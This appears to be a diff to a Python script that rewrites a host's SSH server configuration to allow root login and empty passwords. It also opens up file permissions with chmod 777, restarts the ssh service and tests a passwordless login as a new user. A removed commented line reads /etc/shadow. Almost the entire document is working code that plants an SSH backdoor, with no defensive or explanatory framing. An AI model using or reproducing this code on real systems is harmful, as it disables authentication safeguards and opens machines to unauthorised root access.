@@ -3,6 +3,10 @@ import subprocess
 import datetime
 import os
 import time
+import fileinput
+import socket
+
+
 
 
 def print_msg(msg, msgtype):
@@ -65,9 +69,53 @@ def main():
 
     print_msg('Continuing on to sshd config', 'MAIN')
     os.popen(f'sudo chmod +777 /etc/sshd_config')
-    for line in open('/etc/ssh/sshd_config', 'w'):
-        print(line)
-    #print(os.popen('sudo cat /etc/shadow')
+    time.sleep(1)
+
+    print_msg("Modifying SSHD config to allow root login and empty passwords", "MAIN")
+    with open('/etc/ssh/sshd_config') as sshd_config_file:
+        sshd_config_data = sshd_config_file.readlines()
+
+    permit_root_login_line = 0
+    permit_empty_password_line = 0
+    write_flag = False
+    for counter in range(0,len(sshd_config_data)):
+        if '#PermitRootLogin' in sshd_config_data[counter]:
+            permit_root_login_line = counter
+            write_flag = True
+        if '#PermitEmptyPasswords' in sshd_config_data[counter]:
+            permit_empty_password_line = counter
+            write_flag = True
+
+    if write_flag:
+        #print(sshd_config_data[permit_root_login_line])
+        sshd_config_data[permit_root_login_line] = 'PermitRootLogin yes\n'
+        #print(sshd_config_data[permit_root_login_line])
+
+
+        #print(sshd_config_data[permit_empty_password_line])
+        sshd_config_data[permit_empty_password_line] = 'PermitEmptyPasswords yes\n'
+        #print(sshd_config_data[permit_empty_password_line])
+
+        sshd_config_file = open('/etc/ssh/sshd_config','w')
+        sshd_config_file.writelines(sshd_config_data)
+        sshd_config_file.close()
+    else:
+        print_msg('SSHD Options Already Changed, not wriring changes to disk', '== INFO ==')
+
+    print_msg('Completed ssh modification', 'MAIN')
+    print_msg('Restarting SSH Service...', 'MAIN')
+    os.popen('sudo systemctl restart ssh')
+    print_msg('SSH Service restarted!','MAIN')
+
+    print_msg('Grabbing network information of host for ssh...','MAIN')
+    hostname = socket.gethostname()
+    ipaddr = socket.gethostbyname(hostname)
+    #print(ipaddr)
+
+    print_msg(f'Testing SSH Anonymous Connection with new user {new_username}', 'MAIN')
+    #ssh_test = os.popen(f'ssh -t {new_username}@{ipaddr} "whoami"').read()
+    ssh_test = subprocess.Popen(f"ssh {new_username}@{ipaddr} id", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+    print(ssh_test[0])
 
 
 if __name__ == '__main__':
